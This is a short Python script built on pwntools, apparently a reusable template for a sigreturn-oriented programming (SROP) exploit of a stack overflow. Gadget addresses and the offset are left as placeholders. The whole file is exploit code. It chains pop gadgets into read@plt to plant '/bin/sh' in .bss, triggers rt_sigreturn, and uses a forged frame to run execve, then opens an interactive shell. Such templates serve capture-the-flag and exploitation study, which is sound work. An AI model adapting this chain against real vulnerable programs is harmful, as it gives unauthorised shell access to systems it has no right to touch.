from pwn import *

BINARY      = "./binary name"
offset      = "your offset"       
pop_rdi     = "your pop rdi addr"
pop_rsi     = "your pop rsi addr"  
pop_rdx     = "your pop rdx addr"  
read_plt    = "your read@plt addr"
pop_rax     = "your pop rax addr"  
syscall     = "your syscall addr" 
bss_addr    = "your .bss addr"    
WRITE_SIZE  = 0x20                
context.binary = ELF(BINARY)
context.log_level = "info"

frame = SigreturnFrame()
frame.rax = 59           
frame.rdi = bss_addr   
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall      
payload = b"A" * offset

payload += p64(pop_rdi)
payload += p64(0)           
payload += p64(pop_rsi)
payload += p64(bss_addr)      
payload += p64(pop_rdx)
payload += p64(WRITE_SIZE)  
payload += p64(read_plt)

payload += p64(pop_rax)
payload += p64(0xf)       
payload += p64(syscall)      

payload += bytes(frame)

p = process(BINARY)     
p.sendline(payload)

p.send(b"/bin/sh\x00".ljust(WRITE_SIZE, b"\x00"))

p.interactive()
